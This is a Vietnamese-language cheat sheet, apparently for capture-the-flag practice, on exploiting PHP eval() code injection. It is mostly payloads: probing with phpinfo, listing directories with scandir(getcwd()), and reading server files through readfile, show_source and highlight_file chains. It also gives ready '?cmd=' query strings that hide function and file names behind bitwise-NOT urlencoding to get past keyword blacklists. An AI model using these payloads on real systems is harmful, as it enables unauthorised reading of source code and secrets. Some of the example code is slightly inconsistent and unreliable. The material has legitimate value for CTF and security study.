# Bước 1 : Kiểm tra

`phpinfo(); `  => Thành công => eval( )

# Bước 2 : check các defined functions để xem all the functions
```php
var_dump(get_defined_functions())
```
=> Nếu NULL thì test để đọc all các dir hiện tại
```php
var_dump(scandir(getcwd())) 
```

=> Đầu ra có dạng giống :

`array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(12) "phpinfo.php~" }`

# Bước 3: đọc file
```php
highlight_file(file_get_contents(end(scandir(getcwd()))));        #đọc file cuối mảng

readfile(next(scandir(getcwd())));                                #đọc file ở vị trí thứ 2 của mảng 

show_source(next(array_reverse(scandir(getcwd()))));              #đọc file ở vị trí thứ 3 của mảng bằng cách đaoả ngược mảng rồi => next 
```

- Bằng cách encode urlencode  bằng `~ ` phủ định chuỗi 
- Ví dụ encode mã : readfile("index.php")
```php
$a='readfile'
echo urlencode(~$a)
#=> %8D%9A%9E%9B%99%96%93%9A
# nếu ta ~%8D%9A%9E%9B%99%96%93%9A => readfile
$b='index.php'
echo urlencode(~$b)
#=>%96%91%9B%9A%87%D1%8F%97%8F
```

```php
#bypass blacklist " or keyword readfile
 ?cmd=(~%8D%9A%9E%9B%99%96%93%9A)(~%96%91%9B%9A%87%D1%8F%97%8F);
 ?cmd=readfile(~%96%91%9B%9A%87%D1%8F%97%8F);
```

## một vài lưu hàm có thể sử dụng 
`realpath, realpath_cache_get, domxpath, eio_realpath, gzpassthru, pack, get_include_path` 

=> Các hàm có thể in ra mảng và gtri của nó

`array_keys`
=> In ra all các key trong mảng : VÍ DỤ
```php
$array = array(0 => 100, "color" => "red");
print_r(array_keys($array));
#=> In ra out put là
Array
(
    [0] => 0
    [1] => flag
)
```
## ví dụ minh họa 

```php
readfile(end(array_keys(realpath_cache_get())))
```
=> hiện /path thư mục , vị trí mảng , key và kiểu dữ liệu của all các mảng  `realpath_cache_get( )`

=> Từ đó lấy ra các key của mảng `array_keys( )`

=> Và lấy key của mảng cuối cùng `end( )`

=> Sau đó đọc file qua key tên file đã đc lấy `readfile( )`





